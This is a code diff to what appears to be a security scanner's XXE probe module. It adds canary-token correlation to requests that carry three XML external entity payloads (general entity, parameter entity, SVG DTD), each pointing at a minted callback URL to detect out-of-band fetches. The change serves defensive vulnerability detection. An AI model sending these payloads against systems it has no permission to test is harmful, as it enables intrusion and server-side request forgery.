@@ -4,8 +4,17 @@ import type { Grant } from '.././broker.ts'
 import type { CanaryBroker } from '.././canary-broker.ts'
 import { containsDestructivePayload } from '../../replay-spec.ts'
 import { isPrivateOrLoopbackHost, randToken, responseSimilarity } from './context.ts'
-import type { DiffContext, DiffOutcome } from './context.ts'
+import type { DiffContext, DiffOutcome, InjectedRequest } from './context.ts'
 import type { ProbeModule } from './registry.ts'
+
+/**
+ * Carry the entity canary token as the broker correlation id (`X-Guardian-Trace-Id` in a local
+ * lab). The durable OOB drain attributes a late callback to the recorded exchange that names the
+ * token; the persisted response body does not contain it, and request bodies are not searchable.
+ */
+function withCanaryCorrelation(req: InjectedRequest, token: string): InjectedRequest {
+  return { ...req, traceId: token } as InjectedRequest & { traceId: string }
+}
 
 
 
@@ -68,40 +77,40 @@ export async function diffXxeCanary(
     const body = req.customPayload
       .replaceAll('{{canary_url}}', c.httpUrl)
       .replaceAll('{{canary_dns_host}}', c.dnsHost)
-    await send({ method, pathAndQuery: req.pathAndQuery, body, headers: xmlHeaders, session: req.session, csrfBind: req.csrfBind })
+    await send(withCanaryCorrelation({ method, pathAndQuery: req.pathAndQuery, body, headers: xmlHeaders, session: req.session, csrfBind: req.csrfBind }, c.token))
   } else {
     const c1 = mint('xxe:general_entity')
     minted.push({ variant: 'general_entity', token: c1.token })
-    await send({
+    await send(withCanaryCorrelation({
       method,
       pathAndQuery: req.pathAndQuery,
       body: `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY gxxe SYSTEM "${c1.httpUrl}">]><root>&gxxe;</root>`,
       headers: xmlHeaders,
       session: req.session,
       csrfBind: req.csrfBind,
-    })
+    }, c1.token))
 
     const c2 = mint('xxe:param_entity')
     minted.push({ variant: 'param_entity', token: c2.token })
-    await send({
+    await send(withCanaryCorrelation({
       method,
       pathAndQuery: req.pathAndQuery,
       body: `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % gxxep SYSTEM "${c2.httpUrl}"> %gxxep;]><root>ok</root>`,
       headers: xmlHeaders,
       session: req.session,
       csrfBind: req.csrfBind,
-    })
+    }, c2.token))
 
     const c3 = mint('xxe:svg_dtd')
     minted.push({ variant: 'svg_dtd', token: c3.token })
-    await send({
+    await send(withCanaryCorrelation({
       method,
       pathAndQuery: req.pathAndQuery,
       body: `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE svg [<!ENTITY svgx SYSTEM "${c3.httpUrl}">]><svg xmlns="http://www.w3.org/2000/svg"><text>&svgx;</text></svg>`,
       headers: xmlHeaders,
       session: req.session,
       csrfBind: req.csrfBind,
-    })
+    }, c3.token))
   }
 
   const deadline = Date.now() + Math.max(500, Math.min(req.waitMs ?? 2500, 8000))
